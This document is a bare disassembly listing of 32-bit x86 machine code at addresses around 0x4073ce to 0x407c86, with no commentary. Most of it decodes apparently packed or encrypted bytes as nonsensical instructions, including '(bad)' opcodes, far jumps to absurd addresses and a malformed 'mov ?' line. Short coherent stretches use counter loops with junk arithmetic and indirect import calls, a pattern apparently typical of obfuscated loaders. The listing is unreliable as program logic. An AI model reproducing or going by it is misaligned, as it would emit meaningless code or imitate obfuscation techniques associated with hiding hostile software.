  4073ce:	push   es
  4073cf:	scas   al,BYTE PTR es:[edi]
  4073d0:	cmp    DWORD PTR [edx+eax*8-0x7cb94841],ecx
  4073d7:	mov    esi,0xaf1b1680
  4073dc:	scas   eax,DWORD PTR es:[edi]
  4073dd:	fnstcw WORD PTR [edx+0x456ed29f]
  4073e3:	dec    edx
  4073e4:	fwait
  4073e5:	daa    
  4073e6:	std    
  4073e7:	inc    ebp
  4073e8:	add    DWORD PTR [ebx-0x4618d3a],esi
  4073ee:	cmp    ah,dh
  4073f0:	jg     0x4073ef
  4073f2:	adc    bh,bl
  4073f4:	addr16 adc al,0xeb
  4073f7:	imul   ebp,ebp,0xabeb53c5
  4073fd:	dec    edi
  4073fe:	mov    edi,esp
  407400:	test   esi,eax
  407402:	xor    cl,BYTE PTR [edi+0x3560402f]
  407408:	or     al,dl
  40740a:	adc    eax,0x615abc88
  40740f:	pop    edi
  407410:	cmp    cl,dl
  407412:	sbb    BYTE PTR [ebp-0x65],0x4d
  407416:	(bad)  
  407417:	mov    BYTE PTR [ebp-0x3a],al
  40741a:	sbb    bh,BYTE PTR [esi+0x47441c94]
  407420:	cli    
  407421:	xchg   edx,eax
  407422:	mov    eax,esi
  407424:	sub    ch,BYTE PTR [eax-0x603adc59]
  40742a:	xlat   BYTE PTR ds:[ebx]
  40742b:	cmp    ecx,edi
  40742d:	mov    WORD PTR [ecx-0x7c],ds
  407430:	fs js  0x4073fc
  407433:	fbld   TBYTE PTR [esi+edi*8]
  407436:	aaa    
  407437:	pop    es
  407438:	call   0x9a6d:0x731af748
  40743f:	and    ecx,DWORD PTR [ebx-0x71]
  407442:	mov    es:0x21f29e9a,eax
  407448:	enter  0xec9b,0xbf
  40744c:	outs   dx,BYTE PTR ds:[esi]
  40744d:	mov    ds:0x8f23cca3,eax
  407452:	ins    BYTE PTR es:[edi],dx
  407453:	jl     0x40749c
  407455:	pushf  
  407456:	and    BYTE PTR [edx-0x2df2507],cl
  40745c:	into   
  40745d:	int    0x66
  40745f:	jge    0x407410
  407461:	mov    DWORD PTR cs:[ecx+0x327791ed],eax
  407468:	mov    bh,0xbd
  40746a:	dec    esp
  40746b:	scas   eax,DWORD PTR es:[edi]
  40746c:	lods   eax,DWORD PTR ds:[esi]
  40746d:	jae    0x407476
  40746f:	sti    
  407470:	sub    al,0xf3
  407472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407473:	push   0xffffff94
  407475:	xor    DWORD PTR [edi],0x79f0701d
  40747b:	pop    ecx
  40747c:	in     al,dx
  40747d:	aas    
  40747e:	cli    
  40747f:	sbb    ch,bl
  407481:	inc    esi
  407482:	jge    0x40747a
  407484:	outs   dx,BYTE PTR gs:[esi]
  407486:	xor    edi,DWORD PTR [esi+0x4113a1ee]
  40748c:	adc    DWORD PTR [ebx+0x667fd482],edx
  407492:	inc    ecx
  407493:	loope  0x4074f1
  407495:	mov    ecx,ds
  407497:	xchg   esi,eax
  407499:	es repz sub cl,ah
  40749d:	lds    esp,FWORD PTR [ebx+0x2]
  4074a0:	mov    ds:0x9dc5d0aa,al
  4074a5:	sbb    bh,dl
  4074a7:	add    DWORD PTR [edi+0x638898d6],0xbbfe1c5c
  4074b1:	dec    eax
  4074b2:	repz dec esi
  4074b4:	out    dx,eax
  4074b5:	out    dx,eax
  4074b6:	jp     0x40743d
  4074b8:	fidivr DWORD PTR [ebp-0x27099250]
  4074be:	mov    bl,0x47
  4074c0:	mov    ebx,0xa69beed2
  4074c5:	push   cs
  4074c6:	lahf   
  4074c7:	mov    ?,WORD PTR [edx+0x14046cab]
  4074cd:	out    0x81,al
  4074cf:	xlat   BYTE PTR ds:[ebx]
  4074d0:	hlt    
  4074d1:	jne    0x40748f
  4074d3:	adc    BYTE PTR [ecx+ebp*4],0xe5
  4074d7:	(bad)  
  4074d8:	std    
  4074d9:	in     eax,0x54
  4074db:	and    al,0x43
  4074dd:	mov    dh,0x83
  4074df:	pop    ebx
  4074e0:	js     0x4074df
  4074e2:	jnp    0x407550
  4074e4:	gs test eax,0xaadfae91
  4074ea:	inc    edi
  4074eb:	mov    ch,0xe
  4074ed:	xchg   edx,eax
  4074ee:	xor    DWORD PTR [ebx],ebx
  4074f0:	and    ah,BYTE PTR [edi+0x7]
  4074f3:	pop    ebx
  4074f4:	addr16 push ss
  4074f6:	xchg   esi,eax
  4074f7:	inc    edx
  4074f8:	retf   0x6788
  4074fb:	mov    esi,0x85da1595
  407500:	dec    esi
  407501:	adc    ah,BYTE PTR [esi]
  407503:	fstp   QWORD PTR [edi-0x13]
  407506:	loop   0x4074f5
  407508:	(bad)  
  407509:	fdivr  st,st(1)
  40750b:	adc    ebx,DWORD PTR [eax+eax*2-0x3294294c]
  407512:	mov    bh,0x60
  407514:	push   0x331be9ec
  407519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40751a:	xchg   ebx,eax
  40751b:	sbb    BYTE PTR [eax-0x3b],dl
  40751e:	dec    edx
  40751f:	shl    DWORD PTR [eax],0x61
  407522:	cmp    al,0x5c
  407524:	cmc    
  407525:	adc    eax,0xc525171e
  40752a:	and    al,0xde
  40752c:	daa    
  40752d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40752e:	lods   al,BYTE PTR ds:[esi]
  40752f:	rcl    BYTE PTR [ebx-0x5a],cl
  407532:	push   ebp
  407533:	aas    
  407534:	outs   dx,DWORD PTR ds:[esi]
  407535:	xchg   esp,eax
  407536:	mov    eax,ds:0x34cbef24
  40753b:	ja     0x4074ed
  40753d:	cs dec ecx
  40753f:	into   
  407540:	cmp    eax,edx
  407542:	add    cl,cl
  407544:	inc    esi
  407545:	cmc    
  407546:	push   edi
  407547:	outs   dx,BYTE PTR ds:[esi]
  407548:	cwde   
  407549:	clc    
  40754a:	add    ecx,esi
  40754c:	pusha  
  40754d:	retf   0x6431
  407550:	cmp    ch,BYTE PTR [esi+0x6c]
  407553:	scas   eax,DWORD PTR es:[edi]
  407554:	outs   dx,BYTE PTR ds:[esi]
  407555:	sub    BYTE PTR [ecx+0x6a301f8a],al
  40755b:	adc    cl,bl
  40755d:	lahf   
  40755e:	inc    eax
  40755f:	add    eax,ebx
  407561:	add    dl,BYTE PTR [ebx+0x3dda7bc3]
  407567:	fcomp  QWORD PTR [esp]
  40756a:	mov    ds:0x547435a9,eax
  40756f:	mov    ebx,0xbec53b05
  407574:	cdq    
  407575:	int    0xcb
  407577:	mov    ds:0x2e767913,eax
  40757c:	fs sub ebx,edi
  40757f:	cmp    eax,0x90ec71b3
  407584:	push   esp
  407585:	(bad)
  407588:	pop    esi
  407589:	or     eax,0xab57dc97
  40758e:	and    eax,DWORD PTR [eax-0x5160fe94]
  407594:	inc    edx
  407595:	add    DWORD PTR [esi],esp
  407597:	sbb    cl,BYTE PTR [eax]
  407599:	pusha  
  40759a:	inc    ebp
  40759b:	mov    al,0x61
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	int    0x87
  407657:	sar    dl,0x11
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x407666
  407662:	stos   DWORD PTR es:[edi],eax
  407663:	push   ds
  407664:	push   0xf894008
  407669:	(bad)  
  40766a:	outs   dx,BYTE PTR ds:[esi]
  40766b:	sbb    BYTE PTR [ebx-0x161345cf],bh
  407671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407672:	push   eax
  407673:	mov    esi,0x483c7f6d
  407678:	jg     0x407608
  40767a:	push   0xffffff87
  40767c:	out    0xe6,al
  40767e:	dec    ebx
  40767f:	jge    0x4076b6
  407681:	retf   
  407682:	xchg   esp,eax
  407683:	out    dx,eax
  407684:	jnp    0x4076b2
  407686:	xchg   ebp,eax
  407687:	xor    BYTE PTR [edx],bh
  407689:	pop    ecx
  40768a:	(bad)  
  40768b:	pusha  
  40768c:	fidivr WORD PTR [esi-0x63]
  40768f:	out    dx,al
  407690:	daa    
  407691:	jle    0x4076bd
  407693:	adc    BYTE PTR fs:[edx+0x13],0x41
  407698:	pop    ebx
  407699:	pusha  
  40769a:	jns    0x40761f
  40769c:	std    
  40769d:	adc    BYTE PTR [edi-0x1d],bl
  4076a0:	mov    DWORD PTR [ecx],ebp
  4076a2:	mov    ?,WORD PTR ds:0xd93a484c
  4076a8:	mov    ebp,0x6fec7bc2
  4076ad:	pop    eax
  4076ae:	aam    0xda
  4076b0:	imul   eax,DWORD PTR [edx-0x7],0xfd9eb56
  4076b7:	ss push ecx
  4076b9:	mov    dl,0x74
  4076bb:	icebp  
  4076bc:	arpl   WORD PTR [edx+0x63],sp
  4076bf:	mov    ah,0x1f
  4076c1:	stos   DWORD PTR es:[edi],eax
  4076c2:	adc    eax,0x9a170907
  4076c7:	sub    eax,DWORD PTR [esi]
  4076c9:	pop    ds
  4076ca:	pop    ebp
  4076cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076cc:	cli    
  4076cd:	cld    
  4076ce:	xor    BYTE PTR [ecx-0x49],bl
  4076d1:	xor    esi,DWORD PTR [eax-0x6efbebfd]
  4076d7:	push   ss
  4076d8:	pop    ds
  4076d9:	test   BYTE PTR [ebx+0x18],dl
  4076dc:	cmp    eax,0xd6a39590
  4076e1:	idiv   DWORD PTR [ebx+eax*1]
  4076e4:	out    0x8b,al
  4076e6:	outs   dx,BYTE PTR ds:[esi]
  4076e7:	les    esp,FWORD PTR [eax+ebx*8]
  4076ea:	mov    eax,0x4b36007f
  4076ef:	pop    ss
  4076f0:	mov    eax,ds:0xb6bf9787
  4076f5:	fstp   TBYTE PTR [eax+0x27]
  4076f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f9:	push   edi
  4076fa:	(bad)  
  4076fb:	mov    edx,0x3736fdc
  407700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407701:	int3   
  407702:	pushf  
  407703:	addr16 mov edi,0x7039f609
  407709:	pop    es
  40770a:	loop   0x40774c
  40770c:	sub    edi,DWORD PTR [eax]
  40770e:	jae    0x40770b
  407710:	jmp    0x93351219
  407715:	outs   dx,BYTE PTR ds:[esi]
  407716:	dec    ebx
  407717:	aad    0x70
  407719:	xchg   ecx,eax
  40771a:	jmp    0x4076c5
  40771c:	int3   
  40771d:	lods   eax,DWORD PTR ds:[esi]
  40771e:	pop    esp
  40771f:	hlt    
  407720:	sub    BYTE PTR ds:0x7360419b,ah
  407726:	jmp    0xf3dea911
  40772b:	mov    ah,0xa4
  40772d:	fcomp  QWORD PTR [ebx+ecx*4+0x31]
  407731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407732:	and    ebx,esi
  407734:	enter  0x265c,0x86
  407738:	sbb    ebp,ebx
  40773a:	imul   esp,ebp,0x3428b96a
  407740:	mov    ebx,DWORD PTR [edi+ecx*8+0x75]
  407744:	jg     0x4077b8
  407746:	dec    esp
  407747:	ja     0x407768
  407749:	fstp   DWORD PTR [esi]
  40774b:	pop    es
  40774c:	fistp  DWORD PTR ds:0xc43c2ed6
  407752:	adc    BYTE PTR [esi-0xd],ah
  407755:	aaa    
  407756:	jae    0x407719
  407758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407759:	push   eax
  40775a:	addr16 (bad) 
  40775c:	fisubr DWORD PTR [eax]
  40775e:	push   es
  40775f:	loop   0x407741
  407761:	out    dx,al
  407762:	mov    ch,0x2b
  407764:	mov    ds,WORD PTR [esp+ebx*4-0x63d42b56]
  40776b:	add    al,0xcd
  40776d:	cmp    bh,BYTE PTR [esi]
  40776f:	add    al,0x78
  407771:	adc    DWORD PTR [ebp+0x77],edx
  407774:	push   0x1c0aad57
  407779:	add    DWORD PTR [ebx],esp
  40777b:	xor    BYTE PTR [edx-0x41],ch
  40777e:	mov    edi,0xb3159f12
  407783:	adc    esp,0xffffff82
  407786:	mov    ebp,0x3e0ccc9b
  40778b:	jecxz  0x4077c4
  40778d:	mov    dh,0xec
  40778f:	sbb    ch,al
  407791:	add    BYTE PTR [esi+0x278667e5],bh
  407797:	paddw  mm7,QWORD PTR ds:0xb4848dcf
  40779e:	les    esi,FWORD PTR [edi]
  4077a0:	xor    eax,0xb265fab4
  4077a5:	fmulp  st(1),st
  4077a7:	retf   0x9c13
  4077aa:	mov    esi,0xebe8b1b4
  4077af:	shl    BYTE PTR [edx+0x67],1
  4077b2:	mov    DWORD PTR [esi],ecx
  4077b4:	in     eax,0x53
  4077b6:	push   0xffffffa3
  4077b8:	jns    0x4077d1
  4077ba:	sbb    al,0x46
  4077bc:	or     BYTE PTR [edx-0x14ea17d0],0x2b
  4077c3:	xor    ebx,ebp
  4077c5:	or     edx,DWORD PTR [edx-0xf285656]
  4077cb:	and    esi,DWORD PTR [edi]
  4077cd:	clc    
  4077ce:	pop    edx
  4077cf:	cmp    al,0xbe
  4077d1:	fmulp  st(3),st
  4077d3:	test   DWORD PTR [ebp-0x5bf8efb0],0x8787f8d7
  4077dd:	mov    edx,0x15de2c43
  4077e2:	lahf   
  4077e3:	push   edx
  4077e4:	std    
  4077e5:	das    
  4077e6:	outs   dx,BYTE PTR ds:[esi]
  4077e7:	outs   dx,BYTE PTR ds:[esi]
  4077e8:	jbe    0x40784a
  4077ea:	dec    ebp
  4077eb:	aad    0x21
  4077ed:	icebp  
  4077ee:	and    dl,al
  4077f0:	mov    bh,0x2f
  4077f2:	mov    WORD PTR [ebp+0xae531a5],fs
  4077f8:	jl     0x407857
  4077fa:	xchg   ecx,eax
  4077fb:	add    bh,BYTE PTR [ebp-0x6c18b1cf]
  407801:	pop    ebx
  407802:	or     eax,0xa19a1da0
  407807:	xchg   ecx,eax
  407808:	fwait
  407809:	add    DWORD PTR [ecx-0x515bad7],esi
  40780f:	sar    DWORD PTR [ebp-0x8c0861e],1
  407815:	inc    ebp
  407816:	outs   dx,DWORD PTR ds:[esi]
  407817:	fcom   DWORD PTR [edx+0x5]
  40781a:	aam    0xdd
  40781c:	push   esp
  40781d:	es mov esp,esi
  407820:	sub    DWORD PTR [ebp+0x66],ecx
  407823:	mov    bl,0xef
  407825:	inc    ebx
  407826:	xor    ebx,DWORD PTR [ecx+edi*2]
  407829:	push   ds
  40782a:	xor    bl,BYTE PTR [esi+esi*4-0x28897d7d]
  407831:	mov    BYTE PTR [eax+eiz*8],bl
  407834:	ss jbe 0x4077ce
  407837:	xchg   edx,eax
  407838:	add    BYTE PTR [ebp+0x509afc6e],ch
  40783e:	and    BYTE PTR [ebx+eiz*1],dl
  407841:	nop
  407842:	aam    0xf2
  407844:	pusha  
  407845:	dec    ebp
  407846:	stos   BYTE PTR es:[edi],al
  407847:	pop    edi
  407848:	lds    ebp,FWORD PTR [eax-0x31]
  40784b:	aas    
  40784c:	jge    0x407809
  40784e:	aas    
  40784f:	jg     0x4077d7
  407851:	add    ah,al
  407853:	jle    0x407865
  407855:	repnz xor al,0x2c
  407858:	push   cs
  407859:	push   0x9f3c585c
  40785e:	inc    esp
  40785f:	mov    eax,ds:0xaa30c0a0
  407864:	push   edi
  407866:	inc    esi
  407867:	mov    cl,0x21
  407869:	(bad)  
  40786a:	in     al,dx
  40786b:	ss push esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x5f,eax
  407922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407923:	adc    ecx,esi
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xdb7e7e7c
  40792e:	rcl    BYTE PTR [ecx],0x59
  407931:	test   al,0xcd
  407933:	imul   ebp,DWORD PTR [esi-0x73541041],0x7dee09d2
  40793d:	mov    ch,0xe0
  40793f:	mov    ebp,0x6adb0c62
  407944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407945:	push   ecx
  407946:	xor    bh,0x82
  407949:	std    
  40794a:	into   
  40794b:	sub    dh,BYTE PTR [edx]
  40794d:	inc    esi
  40794e:	pop    edx
  40794f:	mov    esp,0x2927a0ae
  407954:	in     eax,0x68
  407956:	je     0x4079cf
  407958:	cmp    al,0x94
  40795a:	arpl   WORD PTR [ebx-0x10],si
  40795d:	mov    ch,0x4b
  40795f:	rcr    eax,cl
  407961:	popa   
  407962:	adc    al,0xe9
  407964:	loope  0x40797f
  407966:	jo     0x4079e7
  407968:	aas    
  407969:	mov    esi,0xae0b98fd
  40796e:	aam    0x2
  407970:	icebp  
  407971:	outs   dx,BYTE PTR ds:[esi]
  407972:	mov    ch,0xda
  407974:	add    bh,BYTE PTR [esi+edi*4+0x22266c5d]
  40797b:	push   edi
  40797c:	fucomip st,st(4)
  40797e:	jg     0x4079df
  407980:	fs jns 0x4079f6
  407983:	leave  
  407984:	push   ds
  407985:	dec    esi
  407986:	push   esi
  407987:	add    BYTE PTR [eax+edx*1-0x597060e2],0x71
  40798f:	jns    0x4079e0
  407991:	sbb    eax,0xe8dae214
  407996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407997:	xlat   BYTE PTR ds:[ebx]
  407998:	fcomp  st(6)
  40799a:	push   cs
  40799b:	add    DWORD PTR [edx],0x6107d9d8
  4079a1:	push   ecx
  4079a2:	sbb    DWORD PTR [edi+0x1e],ebp
  4079a5:	pushf  
  4079a6:	cmp    al,0xaf
  4079a8:	ds push 0x7a
  4079ab:	cli    
  4079ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ad:	inc    edx
  4079ae:	and    DWORD PTR [ecx+0x54ff8e12],edx
  4079b4:	push   0x615a48de
  4079b9:	je     0x4079d7
  4079bb:	jmp    0x799:0xb3b7d4dd
  4079c2:	mov    esi,0xbf0133b
  4079c7:	imul   ebx,DWORD PTR [esi-0x5bbb58fb],0xffffff8f
  4079ce:	mov    esp,0xbdca6f44
  4079d3:	mov    ebp,0x6414d96c
  4079d8:	sbb    DWORD PTR [edx+0x4e],0x7aeea7f7
  4079df:	aaa    
  4079e0:	cmp    BYTE PTR [ebx+0x39],bl
  4079e3:	or     eax,0x3af77b23
  4079e8:	mov    edx,0xa42d3864
  4079ed:	adc    DWORD PTR [edi],ecx
  4079ef:	js     0x407a4e
  4079f1:	(bad)  
  4079f2:	iret   
  4079f3:	icebp  
  4079f4:	dec    ebp
  4079f5:	es stc 
  4079f7:	xchg   esi,eax
  4079f8:	psubb  mm7,mm6
  4079fb:	ins    DWORD PTR es:[edi],dx
  4079fc:	xor    DWORD PTR [edi+ebx*8],edi
  4079ff:	mov    bh,BYTE PTR [edx-0x7b]
  407a02:	ss scas al,BYTE PTR es:[edi]
  407a04:	cmc    
  407a05:	loop   0x40798f
  407a07:	adc    al,0x7c
  407a09:	mov    al,ds:0xb44dedea
  407a0e:	adc    al,0x85
  407a10:	cmp    DWORD PTR [eax-0x5c0e2e49],0xffffffc0
  407a17:	xchg   ebp,eax
  407a18:	(bad)  
  407a19:	jmp    0x993b:0x6f0ab750
  407a20:	sbb    BYTE PTR [edx-0x4f],dl
  407a23:	inc    edx
  407a24:	cld    
  407a25:	aam    0x6d
  407a27:	dec    esi
  407a28:	rcl    DWORD PTR [esi],0xaf
  407a2b:	add    bl,bh
  407a2d:	data16 sbb bl,dl
  407a30:	inc    ebx
  407a31:	push   0x83e2601b
  407a36:	(bad)  
  407a37:	in     eax,dx
  407a38:	fstp   TBYTE PTR [edx-0x6e]
  407a3b:	or     BYTE PTR fs:[eax+0x8c00369],dh
  407a42:	mov    dh,0x9
  407a44:	xor    cl,BYTE PTR [edi+0x2e62235]
  407a4a:	dec    edi
  407a4b:	stos   DWORD PTR es:[edi],eax
  407a4c:	jae    0x407a43
  407a4e:	test   al,0x4
  407a50:	loop   0x407a31
  407a52:	mov    edi,0xca09edec
  407a57:	clc    
  407a58:	xchg   ebp,eax
  407a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a5a:	call   0xfa657f08
  407a5f:	inc    eax
  407a60:	inc    edx
  407a61:	jg     0x407a09
  407a63:	xchg   BYTE PTR ds:[edx-0x47cef3c],cl
  407a6a:	dec    esi
  407a6b:	adc    ecx,DWORD PTR [ebx+0x1195a41]
  407a71:	aam    0x9e
  407a73:	inc    ebp
  407a74:	push   0x20882a3a
  407a79:	add    edx,DWORD PTR [ecx]
  407a7b:	jno    0x407a52
  407a7d:	sbb    esi,edx
  407a7f:	imul   edx,DWORD PTR [esi],0xfffffff6
  407a82:	inc    eax
  407a83:	pop    ds
  407a84:	xchg   BYTE PTR [edi],ah
  407a86:	jo     0x407ac1
  407a88:	push   0xcf3b258a
  407a8d:	add    edx,ebx
  407a8f:	mov    edx,0xf4714be6
  407a94:	adc    BYTE PTR [edx],ah
  407a96:	xchg   DWORD PTR [edx+0x514b2707],ebp
  407a9c:	mov    cl,0x6c
  407a9e:	cmp    BYTE PTR [edi+ecx*8],al
  407aa1:	scas   al,BYTE PTR es:[edi]
  407aa2:	ins    DWORD PTR es:[edi],dx
  407aa3:	push   esp
  407aa4:	in     eax,dx
  407aa5:	jecxz  0x407a68
  407aa7:	data16 or BYTE PTR [ebx-0x68b01210],ah
  407aae:	sub    al,0xe1
  407ab0:	ret    
  407ab1:	and    DWORD PTR [ecx-0x78675773],edi
  407ab7:	adc    bl,BYTE PTR [edi]
  407ab9:	sahf   
  407aba:	rcl    ebx,1
  407abc:	xlat   BYTE PTR ds:[ebx]
  407abd:	enter  0xd5d7,0xcc
  407ac1:	or     eax,0x6924b404
  407ac6:	lds    ebp,FWORD PTR cs:[ecx-0xd623f56]
  407acd:	pop    ebx
  407ace:	(bad)  
  407acf:	mov    esi,0x5b06cf56
  407ad4:	aaa    
  407ad5:	rcr    dh,cl
  407ad7:	xchg   ebx,eax
  407ad8:	inc    ebx
  407ad9:	cmp    dh,BYTE PTR [eax-0x5e]
  407adc:	popa   
  407add:	fdiv   DWORD PTR [eax+0x3f]
  407ae0:	shr    DWORD PTR [eax+0x5f200458],0xd7
  407ae7:	xchg   esp,eax
  407ae8:	mov    esi,DWORD PTR [si]
  407aeb:	jmp    0x8cf:0x6beaba1b
  407af2:	ficom  DWORD PTR [ebp-0x1c]
  407af5:	add    cl,BYTE PTR [edi-0x31482cae]
  407afb:	mov    ds:0x2e5d2717,eax
  407b00:	and    cl,BYTE PTR [edx+ebx*8-0x45]
  407b04:	ret    0x95db
  407b07:	loope  0x407afc
  407b09:	or     eax,DWORD PTR [edx]
  407b0b:	call   0x3980e750
  407b10:	ror    cl,0x79
  407b13:	mov    al,ds:0x923e53ff
  407b18:	rcr    DWORD PTR [ecx],0x26
  407b1b:	sbb    al,0x1f
  407b1d:	or     bl,BYTE PTR [ebp-0x422a7bd0]
  407b23:	iret   
  407b24:	je     0x407b1f
  407b26:	or     dh,BYTE PTR [edi-0x319c2bca]
  407b2c:	(bad)  
  407b2d:	sar    ch,1
  407b2f:	cmp    ebx,esp
  407b31:	int    0xa1
  407b33:	dec    ebx
  407b34:	lahf   
  407b35:	mov    DWORD PTR [eax],0x81c13359
  407b3b:	adc    eax,0x4336ab
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	loop   0x407c16
  407c4c:	aas    
  407c4d:	call   0x7c05:0x7e7ecc2b
  407c54:	jle    0x407cd4
  407c56:	int3   
  407c57:	lods   eax,DWORD PTR ds:[esi]
  407c58:	je     0x407cb6
  407c5a:	inc    ebx
  407c5b:	pop    ebx
  407c5c:	shr    DWORD PTR [edx+eiz*4],cl
  407c5f:	in     al,0x16
  407c61:	and    dh,BYTE PTR [edx]
  407c63:	cdq    
  407c64:	push   esp
  407c65:	(bad)  
  407c66:	mov    ds:0xce42d8c2,al
  407c6b:	sahf   
  407c6c:	test   eax,0xd421da76
  407c71:	push   es
  407c72:	xchg   esp,eax
  407c73:	or     DWORD PTR [esi],edi
  407c75:	and    eax,0x327d2b24
  407c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7b:	test   DWORD PTR [ebp-0x7a73bb1],ecx
  407c81:	mov    eax,0x203d9a56
  407c86:	outs   dx,BYTE PTR ds:[esi]
